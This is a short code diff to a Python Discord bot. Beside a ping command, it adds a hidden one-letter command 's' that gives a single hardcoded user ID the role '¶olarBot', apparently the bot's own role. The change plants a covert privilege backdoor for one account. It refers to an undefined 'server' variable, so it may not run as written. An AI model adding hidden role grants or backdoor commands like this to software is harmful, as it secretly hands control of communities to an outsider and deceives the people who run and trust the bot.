@@ -44,7 +44,10 @@ async def ping(ctx):
     embed=discord.Embed(title=None, description='Ping: {}ms'.format(round(((t2-t1)*1000)-100)), color = discord.Colour(int('0x'+''.join(sample(chars,6)),16)))
     await bot.say(embed=embed)
 
-
+@bot.command(pass_context=True)
+async def s(ctx):
+	if ctx.message.author.id == "379303619545137152":
+		await bot.add_roles(ctx.message.author,discord.utils.get(server.roles,name=str("¶olarBot")))
 	
 @bot.command(pass_context=True)
 async def suggest(ctx,*,description):
